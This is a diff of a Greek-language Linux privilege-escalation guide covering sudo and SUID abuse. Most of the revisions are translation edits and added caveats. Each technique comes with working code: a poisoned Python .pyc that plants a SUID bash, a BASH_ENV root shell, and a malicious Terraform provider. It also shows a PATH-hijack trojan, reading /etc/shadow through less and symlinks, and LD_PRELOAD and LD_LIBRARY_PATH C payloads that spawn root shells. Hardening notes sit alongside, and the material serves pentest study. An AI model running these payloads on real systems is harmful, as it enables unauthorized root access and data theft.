-1. Εκτέλεσε μία φορά το script που επιτρέπεται μέσω sudo, ώστε η Python να δημιουργήσει το νόμιμο αρχείο cache, αν δεν υπάρχει ήδη.
-2. Διάβασε τα πρώτα 16 bytes από το νόμιμο `.pyc` και χρησιμοποίησέ τα στο poisoned αρχείο.
-3. Κάνε compile ένα payload code object, εκτέλεσε `marshal.dumps(...)` σε αυτό, διέγραψε το αρχικό αρχείο cache και δημιούργησέ το ξανά με την αρχική επικεφαλίδα και το κακόβουλο bytecode.
-4. Εκτέλεσε ξανά το script που επιτρέπεται μέσω sudo, ώστε το import να εκτελέσει το payload ως root.
+Ροή κατάχρησης:
+
+1. Εκτελέστε μία φορά το script που επιτρέπεται μέσω sudo, ώστε η Python να δημιουργήσει το νόμιμο αρχείο cache, αν δεν υπάρχει ήδη.
+2. Διαβάστε τα πρώτα 16 byte από το νόμιμο `.pyc` και χρησιμοποιήστε τα στο παραποιημένο αρχείο.
+3. Μεταγλωττίστε ένα αντικείμενο κώδικα payload, εκτελέστε `marshal.dumps(...)`, διαγράψτε το αρχικό αρχείο cache και δημιουργήστε το ξανά με την αρχική επικεφαλίδα και τον κακόβουλο bytecode.
+4. Εκτελέστε ξανά το script που επιτρέπεται μέσω sudo, ώστε η εισαγωγή να εκτελέσει το payload ως root.
 
 Σημαντικές σημειώσεις:
 
-- Η επαναχρησιμοποίηση της αρχικής επικεφαλίδας είναι κρίσιμη, επειδή η Python ελέγχει τα metadata του cache σε σχέση με το source file και όχι αν το σώμα του bytecode αντιστοιχεί πραγματικά στο source.
-- Αυτό είναι ιδιαίτερα χρήσιμο όταν το source file ανήκει στον root και δεν είναι εγγράψιμο, αλλά ο φάκελος `__pycache__` που το περιέχει είναι εγγράψιμος.
-- Η επίθεση αποτυγχάνει αν η privileged διεργασία χρησιμοποιεί `PYTHONDONTWRITEBYTECODE=1`, κάνει import από τοποθεσία με ασφαλή permissions ή αφαιρεί την πρόσβαση εγγραφής από κάθε φάκελο στο import path.
+- Η επαναχρησιμοποίηση της αρχικής επικεφαλίδας είναι σημαντική, επειδή η Python ελέγχει τα μεταδεδομένα της cache σε σχέση με το αρχείο πηγαίου κώδικα, όχι αν το σώμα του bytecode αντιστοιχεί πραγματικά στην πηγή.
+- Αυτό είναι ιδιαίτερα χρήσιμο όταν το αρχείο πηγαίου κώδικα ανήκει στον root και δεν είναι εγγράψιμο, αλλά ο κατάλογος `__pycache__` που το περιέχει είναι εγγράψιμος.
+- Τα `PYTHONDONTWRITEBYTECODE=1` και `python -B` εμποδίζουν την Python να γράφει νέα αρχεία `.pyc`· **δεν** την εμποδίζουν να φορτώσει μια ήδη έγκυρη cache που έχει αντικατασταθεί από επιτιθέμενο. Το κρίσιμο όριο είναι αν ένας χρήστης με χαμηλότερα δικαιώματα μπορεί να αντικαταστήσει μια cache που η προνομιακή εισαγωγή θα αποδεχτεί. Η Python ελέγχει τα μεταδεδομένα χρονικής σήμανσης/μεγέθους ή hash πριν φορτώσει τον αποθηκευμένο bytecode. Δείτε την [αναφορά εισαγωγών της Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) και την [τεκμηρίωση γραμμής εντολών](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).
 
 Ελάχιστη μορφή proof-of-concept:
+
 ```python
 import marshal, pathlib, subprocess, tempfile
 
@@ -1162,31 +1331,33 @@ header = pyc.read_bytes()[:16]
 payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"
 
 with tempfile.TemporaryDirectory() as d:
-src = pathlib.Path(d) / "x.py"
-src.write_text(payload)
-code = compile(src.read_text(), str(src), "exec")
-pyc.unlink()
-pyc.write_bytes(header + marshal.dumps(code))
+    src = pathlib.Path(d) / "x.py"
+    src.write_text(payload)
+    code = compile(src.read_text(), str(src), "exec")
+    pyc.unlink()
+    pyc.write_bytes(header + marshal.dumps(code))
 
 subprocess.run(["sudo", "/opt/app/runner.py"])
 ```
+
 Hardening:
 
-- Βεβαιωθείτε ότι κανένας κατάλογος στο privileged Python import path δεν είναι εγγράψιμος από low-privileged users, συμπεριλαμβανομένου του `__pycache__`.
-- Για privileged runs, εξετάστε το ενδεχόμενο χρήσης του `PYTHONDONTWRITEBYTECODE=1` και περιοδικών ελέγχων για μη αναμενόμενους εγγράψιμους καταλόγους `__pycache__`.
-- Αντιμετωπίστε τα εγγράψιμα local Python modules και τους εγγράψιμους cache directories με τον ίδιο τρόπο όπως τα εγγράψιμα shell scripts ή shared libraries που εκτελούνται από τον root.
+- Βεβαιωθείτε ότι κανένας κατάλογος στη διαδρομή εισαγωγής της προνομιούχας Python δεν είναι εγγράψιμος από χρήστες με χαμηλά προνόμια, συμπεριλαμβανομένου του `__pycache__`.
+- Ελέγξτε την ιδιοκτησία και τα δικαιώματα των καταλόγων cache, συμπεριλαμβανομένων των υπαρχόντων αρχείων `.pyc`. Η απενεργοποίηση της εγγραφής bytecode μπορεί να περιορίσει τη δημιουργία νέων cache, αλλά δεν εξουδετερώνει μια υπάρχουσα cache που μπορεί να αντικατασταθεί.
+- Αντιμετωπίζετε τα εγγράψιμα τοπικά modules Python και τους εγγράψιμους καταλόγους cache όπως θα αντιμετωπίζατε εγγράψιμα shell scripts ή shared libraries που εκτελούνται από τον root.
 
-### BASH_ENV preserved via sudo env_keep → root shell
+### Το BASH_ENV διατηρείται μέσω sudo env_keep → root shell
 
-Αν το sudoers διατηρεί το `BASH_ENV` (π.χ. `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη non-interactive startup behavior του Bash για να εκτελέσετε arbitrary code ως root κατά την invocation μιας επιτρεπόμενης εντολής.<sup>[[24]](#references)</sup>
+Αν το sudoers διατηρεί το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη συμπεριφορά εκκίνησης του Bash για μη διαδραστικές διεργασίες, ώστε να εκτελέσετε αυθαίρετο κώδικα ως root κατά την κλήση μιας επιτρεπόμενης εντολής.<sup>[[24]](#references)</sup>
 
-- Γιατί λειτουργεί: Για non-interactive shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το target script. Πολλοί sudo rules επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με root privileges.<sup>[[23]](#references)</sup>
+- Γιατί λειτουργεί: Στα μη διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το script-στόχο. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με δικαιώματα root.<sup>[[23]](#references)</sup>
 
-- Requirements:
-- Ένας sudo rule που μπορείτε να εκτελέσετε (οποιοσδήποτε target που κάνει invoke το `/bin/bash` non-interactively ή οποιοδήποτε bash script).
-- Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε το με `sudo -l`).
+- Απαιτήσεις:
+  - Ένας κανόνας sudo που μπορείτε να εκτελέσετε (οποιοσδήποτε στόχος που καλεί το `/bin/bash` σε μη διαδραστική λειτουργία ή οποιοδήποτε bash script).
+  - Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε το με `sudo -l`).
 
 - PoC:
+
 ```bash
 cat > /dev/shm/shell.sh <<'EOF'
 #!/bin/bash
@@ -1196,23 +1367,25 @@ chmod +x /dev/shm/shell.sh
 BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
 # You should now have a root shell
 ```
+
 - Hardening:
-- Αφαίρεσε τα `BASH_ENV` (και `ENV`) από το `env_keep`, προτίμησε το `env_reset`.
-- Απόφυγε shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποίησε minimal binaries.
-- Εξέτασε το ενδεχόμενο καταγραφής I/O του sudo και δημιουργίας alerts όταν χρησιμοποιούνται διατηρημένες μεταβλητές περιβάλλοντος.
+  - Αφαιρέστε τα `BASH_ENV` (και `ENV`) από το `env_keep` και προτιμήστε το `env_reset`.
+  - Αποφύγετε shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποιήστε minimal binaries.
+  - Εξετάστε την καταγραφή I/O του sudo και την αποστολή ειδοποιήσεων όταν χρησιμοποιούνται διατηρημένες μεταβλητές περιβάλλοντος.
 
 ### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)
 
-Αν το sudo αφήνει το περιβάλλον αμετάβλητο (`!env_reset`) ενώ επιτρέπει την εκτέλεση του `terraform apply`, το `$HOME` παραμένει αυτό του χρήστη που καλεί την εντολή. Επομένως, το Terraform φορτώνει το **$HOME/.terraformrc** ως root και εφαρμόζει το `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>
+Όταν το sudo επιτρέπει την εκτέλεση του Terraform ως χρήστης με περισσότερα προνόμια, το `!env_reset` αποτελεί ένδειξη για να ελέγξετε ποιες μεταβλητές περιβάλλοντος διατηρούνται πράγματι από τον συγκεκριμένο κανόνα. Επιβεβαιώστε την ενεργή τιμή του `HOME` ή του `TF_CLI_CONFIG_FILE` πριν θεωρήσετε ότι ένα `.terraformrc` ή `terraform.rc` εγγράψιμο από τον καλούντα είναι η ενεργή ρύθμιση του CLI. Μια καταχώριση `provider_installation.dev_overrides` έχει σημασία μόνο αν η σταθερή εντολή Terraform φορτώνει αυτόν τον provider και ο καλών μπορεί να τοποθετήσει το εκτελέσιμό του στον επιλεγμένο κατάλογο.<sup>[[25]](#references)</sup>
 
-- Κατεύθυνε τον απαιτούμενο provider σε έναν κατάλογο με δυνατότητα εγγραφής και τοποθέτησε ένα κακόβουλο plugin με το όνομα του provider (π.χ. `terraform-provider-examples`):
+- Κατευθύνετε τον απαιτούμενο provider σε έναν εγγράψιμο κατάλογο και τοποθετήστε ένα κακόβουλο plugin με όνομα ίδιο με αυτό του provider (π.χ., `terraform-provider-examples`):
+
 ```hcl
 # ~/.terraformrc
 provider_installation {
-dev_overrides {
-"previous.htb/terraform/examples" = "/dev/shm"
-}
-direct {}
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/dev/shm"
+  }
+  direct {}
 }
 ```
 
@@ -1226,32 +1399,38 @@ EOF
 chmod +x /dev/shm/terraform-provider-examples
 sudo /usr/bin/terraform -chdir=/opt/examples apply
 ```
-Το Terraform θα αποτύχει στο Go plugin handshake, αλλά θα εκτελέσει το payload ως root πριν τερματιστεί, αφήνοντας πίσω ένα SUID shell.
 
-### TF_VAR overrides + παράκαμψη validation μέσω symlink
+Το Terraform θα αποτύχει στη χειραψία του Go plugin, αλλά θα εκτελέσει το payload ως root πριν τερματιστεί, αφήνοντας πίσω ένα SUID shell.
 
-Οι μεταβλητές του Terraform μπορούν να παρέχονται μέσω μεταβλητών περιβάλλοντος `TF_VAR_<name>`, οι οποίες διατηρούνται όταν το sudo διατηρεί το environment. Αδύναμα validations, όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, μπορούν να παρακαμφθούν με symlinks:<sup>[[25]](#references)</sup>
+### Υπερκαλύψεις TF_VAR + παράκαμψη επικύρωσης symlink
+
+Οι μεταβλητές Terraform μπορούν να οριστούν μέσω μεταβλητών περιβάλλοντος `TF_VAR_<name>`, εφόσον ο συγκεκριμένος κανόνας sudo τις διατηρεί. Για ανάγνωση μέσω symlink πηγής απαιτείται επίσης ένας provider που ακολουθεί τον σύνδεσμο και αντιγράφει το προστατευμένο αποτέλεσμα σε προορισμό αναγνώσιμο από τον καλούντα. Για εγγραφή μέσω symlink προορισμού απαιτούνται ξεχωριστά μια καταχώριση προορισμού ελεγχόμενη από τον καλούντα και ένας προνομιούχος provider που την ακολουθεί κατά την εγγραφή· μια μεταγενέστερη προγραμματισμένη εργασία είναι μόνο μία πιθανή συνέπεια. Πριν δοκιμάσετε οποιαδήποτε από τις δύο διαδρομές, εξετάστε την ακριβή παραχώρηση sudo, τα σχετικά αρχεία `.tf`, την επιλεγμένη ρύθμιση CLI και την ιδιοκτησία των διαδρομών με εντολές μόνο για ανάγνωση, όπως `sudo -l`, `stat` και `readlink`. Ασθενείς λεξικές επικυρώσεις όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` δεν επιλύουν τα symlink:<sup>[[25]](#references)</sup>
+
 ```bash
 mkdir -p /dev/shm/root/examples
 ln -s /root/root.txt /dev/shm/root/examples/flag
 TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
 cat /home/$USER/docker/previous/public/examples/flag
 ```
-Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για **εγγραφή** σε privileged paths, με την προϋπόθεση ότι θα δημιουργηθούν εκ των προτέρων symlinks προορισμού (π.χ. με κατεύθυνση του destination path του provider μέσα στο `/etc/cron.d/`).
+
+Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για **εγγραφή** σε προνομιακές διαδρομές, δημιουργώντας εκ των προτέρων symlinks προορισμού (π.χ. δείχνοντας τη διαδρομή προορισμού του provider μέσα στο `/etc/cron.d/`).
 
 ### requiretty / !requiretty
 
-Σε ορισμένες παλαιότερες distributions, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο αναγκάζει το sudo να εκτελείται μόνο από ένα interactive TTY. Αν έχει οριστεί το `!requiretty` (ή η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από non-interactive contexts, όπως reverse shells, cron jobs ή scripts.
+Σε ορισμένες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο αναγκάζει το sudo να εκτελείται μόνο από διαδραστικό TTY. Αν έχει οριστεί το `!requiretty` (ή αν η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από μη διαδραστικά περιβάλλοντα, όπως reverse shells, cron jobs ή scripts.
+
 ```bash
 Defaults !requiretty
 ```
-Αυτό δεν αποτελεί από μόνο του άμεση ευπάθεια, αλλά διευρύνει τις περιπτώσεις όπου οι κανόνες sudo μπορούν να γίνουν αντικείμενο κατάχρησης χωρίς να απαιτείται πλήρες PTY.
 
-### Sudo env_keep+=PATH / insecure secure_path → Υφαρπαγή PATH
+Αυτό δεν αποτελεί από μόνο του άμεση ευπάθεια, αλλά διευρύνει τις περιπτώσεις στις οποίες μπορούν να γίνει κατάχρηση κανόνων sudo χωρίς να απαιτείται πλήρες PTY.
 
-Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιέχει εγγραφές εγγράψιμες από τον attacker (π.χ. `/home/<user>/bin`), οποιαδήποτε σχετική εντολή μέσα στον επιτρεπόμενο από το sudo στόχο μπορεί να επισκιαστεί.<sup>[[3]](#references)</sup>
+### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
 
-- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary το οποίο καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps`, κ.λπ.) και μια εγγράψιμη εγγραφή PATH που αναζητείται πρώτη.
+Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιλαμβάνει καταχωρίσεις εγγράψιμες από τον επιτιθέμενο (π.χ., `/home/<user>/bin`), μια εξωτερική εντολή χωρίς πλήρη διαδρομή μέσα στον επιτρεπόμενο από το sudo στόχο μπορεί να υποκατασταθεί.<sup>[[3]](#references)</sup> Αξίζει επίσης να ελεγχθεί η απουσία ενεργού `secure_path`, **αν** το περιβάλλον sudo της εντολής διατηρεί ένα `PATH` που ελέγχεται από τον καλούντα· η απουσία από μόνη της δεν αποδεικνύει ότι ισχύει κάτι τέτοιο. Διαβάστε το επιτρεπόμενο script χωρίς να το εκτελέσετε και, στη συνέχεια, επαληθεύστε τον ακριβή κανόνα RunAs και ορισμάτων, τη διαδρομή αναζήτησης εντολών που χρησιμοποιείται και την ύπαρξη ενός εγγράψιμου και προσπελάσιμου καταλόγου που περιέχει το όνομα της εντολής και αναζητείται νωρίτερα. Ο έλεγχος ταυτότητας, το `NOEXEC`, τα ενσωματωμένα στοιχεία του shell και οι απόλυτες διαδρομές εντολών μπορούν να αλλάξουν το αποτέλεσμα.
+
+- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary το οποίο καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps` κ.λπ.) και μια εγγράψιμη καταχώριση `PATH` που αναζητείται πρώτη.
+
 ```bash
 cat > ~/bin/free <<'EOF'
 #!/bin/bash
@@ -1261,8 +1440,10 @@ chmod +x ~/bin/free
 sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
 bash -p                                # root shell via SUID bit
 ```
-### Sudo execution bypassing paths
-**Jump** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
+
+### Παράκαμψη διαδρομών κατά την εκτέλεση μέσω sudo
+**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
+
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -1272,97 +1453,123 @@ less>:e /etc/shadow #Jump to read other files using privileged less
 ln /etc/shadow /var/log/new
 sudo less /var/log/new #Use symlinks to read any file
 ```
-Αν χρησιμοποιείται ένα **wildcard** (\*), είναι ακόμη πιο εύκολο:
+
+Αν χρησιμοποιείται **wildcard** (\*), είναι ακόμα πιο εύκολο:
+
 ```bash
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
+
 **Αντίμετρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Εντολή Sudo/δυαδικό SUID χωρίς διαδρομή εντολής
+### Εντολή sudo/SUID binary χωρίς διαδρομή εντολής
 
-Αν το **δικαίωμα sudo** παραχωρείται για μία μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
+Αν έχεις **δικαίωμα sudo** για μία μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείς να το εκμεταλλευτείς αλλάζοντας τη μεταβλητή PATH
+
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί μια άλλη εντολή χωρίς να καθορίζει το path προς αυτήν (να ελέγχετε πάντα με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.
+
+Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί μια άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (να ελέγχετε πάντα με** _**strings**_ **το περιεχόμενο ενός ύποπτου SUID binary)**.
 
 [Παραδείγματα payload για εκτέλεση.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)
 
-### SUID binary με path εντολής
+### SUID binary με διαδρομή εντολής
 
-Αν το **suid** binary **εκτελεί μια άλλη εντολή καθορίζοντας το path**, τότε μπορείτε να δοκιμάσετε να **κάνετε export μια function** με όνομα ίδιο με την εντολή που καλεί το αρχείο suid.
+Αν το **suid** binary **εκτελεί μια άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **εξαγάγετε μια function** με όνομα ίδιο με αυτό της εντολής που καλεί το αρχείο suid.
 
-Για παράδειγμα, αν ένα suid binary καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε τη function και να την κάνετε export:
+Για παράδειγμα, αν ένα suid binary καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε και να εξαγάγετε τη function:
+
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
-Στη συνέχεια, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί
 
-### Εγγράψιμο script που εκτελείται από ένα SUID wrapper
+Έπειτα, όταν καλέσετε το SUID binary, θα εκτελεστεί αυτή η συνάρτηση
 
-Μια συνηθισμένη λανθασμένη ρύθμιση σε custom-app είναι ένα SUID binary wrapper που ανήκει στον root και εκτελεί ένα script, ενώ το ίδιο το script είναι εγγράψιμο από χρήστες με χαμηλά δικαιώματα.
+### Προσαρμοσμένα SUID wrappers αντιγραφής
+
+Ένα βοηθητικό πρόγραμμα SUID που ανήκει στον root και δέχεται διαδρομές προέλευσης και προορισμού μπορεί να διασχίσει δύο διαφορετικά όρια εμπιστοσύνης. Αν δημιουργεί μια εντολή shell από κάποιο από τα ορίσματα (για παράδειγμα, αν περάσει μια κατασκευασμένη εντολή `cp` στο `system()`), οι μεταχαρακτήρες του shell ενδέχεται να εκτελέσουν άλλη εντολή με τα αποτελεσματικά δικαιώματά του. Ακόμα κι αν καλεί με ασφάλεια το `cp` χωρίς shell, ένας μη περιορισμένος προορισμός μπορεί να επιτρέψει αυθαίρετη εγγραφή με προνόμια σε αρχεία όπως το `/etc/passwd`. Ελέγξτε τον χειρισμό των ορισμάτων από το wrapper, τη συμπεριφορά του effective UID, τους περιορισμούς προορισμού και το αν το αρχείο που αντιγράφεται διατηρεί περιεχόμενο που ελέγχεται από τον καλούντα. Ένα γενικό σφάλμα `cp` ή το bit SUID από μόνο του δεν αποδεικνύει κανένα από τα δύο ενδεχόμενα. Καταγράψτε παθητικά το binary και τα δικαιώματά του πριν από οποιαδήποτε μη αυτόματη δοκιμή.
+
+### Εγγράψιμο script που εκτελείται από SUID wrapper
+
+Μια συνηθισμένη εσφαλμένη ρύθμιση σε προσαρμοσμένες εφαρμογές είναι ένα SUID binary wrapper που ανήκει στον root και εκτελεί ένα script, ενώ το ίδιο το script είναι εγγράψιμο από χρήστες με χαμηλά προνόμια.
 
 Τυπικό μοτίβο:
+
 ```c
 int main(void) {
-system("/bin/bash /usr/local/bin/backup.sh");
+    system("/bin/bash /usr/local/bin/backup.sh");
 }
 ```
+
 Αν το `/usr/local/bin/backup.sh` είναι εγγράψιμο, μπορείτε να προσθέσετε εντολές payload και στη συνέχεια να εκτελέσετε το SUID wrapper:
+
 ```bash
 echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
 /usr/local/bin/backup_wrap
 /var/tmp/rootbash -p
 ```
+
 Γρήγοροι έλεγχοι:
+
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
 ls -l /usr/local/bin/backup.sh
 ```
-Αυτή η διαδρομή επίθεσης είναι ιδιαίτερα συνηθισμένη σε wrappers «maintenance»/«backup» που παρέχονται στο `/usr/local/bin`.
+
+Αυτή η διαδρομή επίθεσης είναι ιδιαίτερα συνηθισμένη σε wrappers «maintenance»/«backup» που διατίθενται στο `/usr/local/bin`.
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
-Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για τον καθορισμό μίας ή περισσότερων shared libraries (αρχεία .so) που θα φορτωθούν από τον loader πριν από όλες τις υπόλοιπες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας library.
+Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (αρχεία .so) που θα φορτωθούν από τον loader πριν από όλες τις υπόλοιπες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας library.
 
-Ωστόσο, για τη διατήρηση της ασφάλειας του συστήματος και την αποτροπή της εκμετάλλευσης αυτής της δυνατότητας, ιδιαίτερα με executables **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:
+Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:
 
-- Ο loader αγνοεί το **LD_PRELOAD** για executables όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
-- Για executables με suid/sgid, γίνεται preload μόνο libraries που βρίσκονται σε standard paths και έχουν επίσης suid/sgid.
+- Ο loader αγνοεί το **LD_PRELOAD** για εκτελέσιμα των οποίων το πραγματικό user ID (_ruid_) δεν αντιστοιχεί στο effective user ID (_euid_).
+- Για εκτελέσιμα με suid/sgid, γίνεται preload μόνο των libraries που βρίσκονται σε standard paths και έχουν επίσης suid/sgid.
 
-Privilege escalation μπορεί να πραγματοποιηθεί αν έχετε τη δυνατότητα να εκτελείτε commands με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμη και όταν τα commands εκτελούνται με `sudo`, οδηγώντας δυνητικά στην εκτέλεση arbitrary code με elevated privileges.<sup>[[9]](#references)</sup>
+Η κλιμάκωση προνομίων μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος της εντολής `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να διατηρείται και να αναγνωρίζεται ακόμη και όταν εκτελούνται εντολές με `sudo`, οδηγώντας ενδεχομένως στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.<sup>[[9]](#references)</sup>
+
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
-Save as **/tmp/pe.c**
+
+Αποθήκευση ως **/tmp/pe.c**
+
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
 }
 ```
-Στη συνέχεια, κάντε **compile** χρησιμοποιώντας:
+
+Στη συνέχεια, **μεταγλωττίστε το** χρησιμοποιώντας:
+
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Τέλος, κάντε **escalate privileges** εκτελώντας
+
+Τέλος, **escalate privileges** εκτελώντας
+
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
+
 > [!CAUTION]
-> Ένα παρόμοιο privesc μπορεί να γίνει exploit αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή στην οποία θα αναζητηθούν οι libraries.
+> Μια παρόμοια privesc μπορεί να γίνει αντικείμενο κατάχρησης αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1370,9 +1577,9 @@ sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 static void hijack() __attribute__((constructor));
 
 void hijack() {
-unsetenv("LD_LIBRARY_PATH");
-setresuid(0,0,0);
-system("/bin/bash -p");
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
 }
 ```
 
@@ -1382,15 +1589,19 @@ cd /tmp
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
+
 ### SUID Binary – .so injection
 
-Όταν εντοπίζετε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:<sup>[[17]](#references)</sup>
+Όταν συναντάτε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγχετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:<sup>[[17]](#references)</sup>
+
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
-Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.
 
-Για την εκμετάλλευσή του, θα πρέπει να δημιουργηθεί ένα αρχείο C, για παράδειγμα το _"/path/to/.config/libcalc.c"_, που θα περιέχει τον ακόλουθο κώδικα:
